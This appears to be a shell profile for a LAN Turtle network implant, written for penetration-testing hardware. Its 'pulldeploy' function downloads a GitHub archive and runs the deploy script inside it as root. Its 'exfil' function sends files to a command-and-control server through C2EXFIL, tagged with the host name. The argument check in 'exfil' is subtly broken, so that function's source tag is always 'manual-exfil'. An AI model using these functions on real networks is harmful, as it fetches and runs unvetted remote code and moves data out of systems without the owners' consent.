# ash shell
alias ll="ls -la"

## functions
pulldeploy() {
  if [ -f /root/main.zip ]
  then
    rm /root/main.zip
  fi
  cd
  wget https://github.com/shaunsund/lanturtle-scripts/archive/refs/heads/main.zip
  unzip main.zip
  cd lanturtle-scripts-main
  ./deploy.sh
}

deploycleanup() {
  cd

  if [ -f /root/main.zip ]
  then
    rm /root/main.zip
  fi

  if [ -d /root/lanturtle-scripts-main ]
  then
    rm -rfv /root/lanturtle-scripts-main
  fi
}

exfil() {
  if [ "$2"="" ]
  then
    source="manual-exfil"
  else
    source=$2
  fi

  if ! C2EXFIL STRING $1 ${HOSTNAME}-$source
  then
    echo "error exfiltrating $1"
  fi
}
